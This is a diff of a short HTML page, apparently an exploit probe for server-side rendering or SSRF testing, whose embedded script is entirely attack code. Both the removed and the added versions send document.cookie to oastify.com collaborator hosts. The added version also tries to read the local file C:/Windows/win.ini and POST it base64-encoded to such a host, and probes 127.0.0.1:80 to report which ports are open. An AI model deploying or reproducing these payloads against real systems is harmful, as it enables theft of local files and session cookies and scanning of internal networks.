@@ -1,15 +1,26 @@
 <!DOCTYPE html>
 <html>
 <body>
+<h1>Testing</h1>
 <script>
-// Exfiltrate any data available
-fetch('http://data.vmlchz7bhkbmk0v8zyh0rw019sfj3dr2.oastify.com?cookies=' + encodeURIComponent(document.cookie));
-
-// Try to access internal services
-fetch('http://localhost/wp-admin/')
+// Test 1: Try to read local Windows file
+fetch('file:///C:/Windows/win.ini')
   .then(r => r.text())
-  .then(html => fetch('http://admin.vmlchz7bhkbmk0v8zyh0rw019sfj3dr2.oastify.com?len=' + html.length))
-  .catch(e => fetch('http://error.vmlchz7bhkbmk0v8zyh0rw019sfj3dr2.oastify.com?e=' + e));
+  .then(data => {
+    fetch('http://winini.yjlfe24een8ph3sbw1e3ozx46vcm0ho6.oastify.com', {
+      method: 'POST',
+      body: btoa(data)
+    });
+  })
+  .catch(e => fetch('http://error1.lrg2mpc1magcpq0y4omqwm5reik98zwo.oastify.com?e=' + encodeURIComponent(e.message)));
+
+// Test 2: Scan internal network
+fetch('http://127.0.0.1:80')
+  .then(() => fetch('http://port80.yjlfe24een8ph3sbw1e3ozx46vcm0ho6.oastify.com?open=true'))
+  .catch(() => fetch('http://port80.yjlfe24een8ph3sbw1e3ozx46vcm0ho6.oastify.com?open=false'));
+
+// Test 3: Exfiltrate any available data
+fetch('http://info.yjlfe24een8ph3sbw1e3ozx46vcm0ho6.oastify.com?url=' + encodeURIComponent(window.location.href) + '&cookie=' + encodeURIComponent(document.cookie));
 </script>
 </body>
 </html>
